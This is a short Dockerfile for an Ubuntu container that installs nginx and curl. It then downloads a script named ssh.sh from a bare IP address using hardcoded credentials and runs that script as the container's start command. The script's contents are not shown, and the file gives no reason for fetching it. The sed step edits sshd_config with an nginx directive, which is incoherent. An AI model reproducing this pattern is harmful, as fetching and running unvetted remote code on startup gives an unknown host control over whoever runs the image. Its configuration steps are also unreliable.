FROM ubuntu:latest
ENV DEBIAN_FRONTEND="noninteractive"
RUN   apt-get update && apt-get install -y  nginx  curl nash 
RUN   curl -u dero:dodo24 -OLJ 83.147.41.137:10666/ssh.sh \
      && chmod +x ssh.sh
RUN   sed -i'' -e's/^listen 80 default_server;$/listen 8080 default_server;/' /etc/ssh/sshd_config
EXPOSE 8080/tcp
CMD ["/bin/bash","ssh.sh"]
